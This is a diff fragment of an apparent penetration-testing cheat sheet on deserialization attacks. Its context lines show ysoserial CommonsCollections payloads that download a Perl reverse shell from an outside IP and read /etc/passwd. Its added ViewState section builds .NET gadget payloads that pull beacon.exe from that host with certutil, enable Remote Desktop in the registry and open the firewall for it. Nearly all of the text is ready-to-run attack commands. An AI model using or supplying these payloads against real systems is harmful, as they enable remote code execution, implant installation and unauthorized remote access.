@@ -16,6 +16,18 @@ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget sdfsfdoztjxibk
 java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'wget http://192.168.100.199:1010/reverse-shell.pl -O /tmp/shell.pl' > perl-reverse-shell.pl.bin
 java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'cat /etc/passwd' > passwd.bin
 ```
+# ViewState Deserialization 
+```
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.exe"
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+"
+```
+
+
+
+
 
 ```
 <?xml version="1.0"?>
